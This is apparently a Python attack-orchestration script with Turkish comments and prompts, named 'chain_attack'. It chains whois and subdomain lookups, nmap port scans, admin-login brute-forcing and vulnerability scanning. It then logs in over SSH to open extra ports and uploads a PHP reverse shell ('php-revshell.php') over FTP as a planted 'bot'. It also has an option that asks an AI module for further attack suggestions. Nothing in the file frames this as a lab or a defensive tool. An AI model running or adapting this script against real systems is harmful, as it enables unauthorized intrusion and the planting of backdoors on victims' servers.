import modules.bot as bot_module
import tools.nmap_scanner as nmap_tool
import modules.web_scanner as web_scanner
import modules.web_bruteforce as web_brute
import tools.whois_lookup as whois_tool
import tools.subdomain_finder as subdomain_tool
import tools.ai_suggestions as ai
import json

def chain_attack(target, options):
    print(f"\n[⚙] Chain attack başlatılıyor: {target}\n")

    report = {
        "target": target,
        "open_ports": [],
        "subdomains": [],
        "whois": None,
        "admin_login_result": None,
        "vuln_scan": None,
        "ftp_upload": None,
        "ssh_ports": None,
        "ai_suggestions": [],
    }

    # Whois
    if options.get("whois"):
        report["whois"] = whois_tool.get_whois_info(target)

    # Subdomain Scan
    if options.get("subdomains"):
        report["subdomains"] = subdomain_tool.find_subdomains(target)

    # Port Tarama
    open_ports = nmap_tool.run_scan(target)
    report["open_ports"] = open_ports
    print(f"[🟢] Açık portlar: {open_ports}")

    # Web saldırıları (port 80/443 varsa ya da zorla)
    if 80 in open_ports or 443 in open_ports or options.get("web"):
        print("[🌐] Web saldırıları başlatılıyor...")
        report["admin_login_result"] = web_brute.run_admin_brute(target)
        report["vuln_scan"] = web_scanner.scan_vulnerabilities(target)

    # SSH brute-force ve port açma (SSH açıksa)
    if options.get("ssh") and 22 in open_ports:
        username = input("SSH kullanıcı adı: ")
        password = input("SSH şifresi: ")
        ssh_client = bot_module.ssh_connect(target, username, password)
        if ssh_client:
            result = bot_module.open_ports_ssh(ssh_client, [3600, 3436])
            report["ssh_ports"] = "açıldı" if result else "başarısız"
            ssh_client.close()

    # FTP bot yükleme (FTP portu varsa)
    if options.get("ftp") and 21 in open_ports:
        ftp_user = input("FTP kullanıcı adı: ")
        ftp_pass = input("FTP şifresi: ")
        local_bot_path = "php-revshell.php"
        remote_path = input("Yüklenecek yol (örnek uploads/shell.php): ")
        uploaded = bot_module.upload_bot_ftp(target, ftp_user, ftp_pass, local_bot_path, remote_path)
        report["ftp_upload"] = "başarılı" if uploaded else "başarısız"

    # AI destekli öneriler
    if options.get("ai"):
        report["ai_suggestions"] = ai.suggest_attacks(report)

    # Rapor yaz
    with open(f"reports/{target}_report.json", "w") as f:
        json.dump(report, f, indent=4, ensure_ascii=False)
    print(f"\n[📄] Rapor kaydedildi: reports/{target}_report.json")

    print("[✅] Zincir saldırı tamamlandı.\n")

# 🧠 CLI'den çalıştırıldığında tetiklenmesi için:
if __name__ == "__main__":
    import sys

    target = input("Hedef IP veya domain: ").strip()

    options = {
        "whois": input("Whois analizi yapılsın mı? (y/n): ").lower() == 'y',
        "subdomains": input("Subdomain taraması yapılsın mı? (y/n): ").lower() == 'y',
        "web": input("Web saldırıları (admin brute, zafiyet taraması) yapılsın mı? (y/n): ").lower() == 'y',
        "ssh": input("SSH brute-force ve port açma yapılsın mı? (y/n): ").lower() == 'y',
        "ftp": input("FTP üzerinden bot yüklensin mi? (y/n): ").lower() == 'y',
        "ai": input("AI destekli saldırı önerileri alınsın mı? (y/n): ").lower() == 'y',
    }

    chain_attack(target, options)
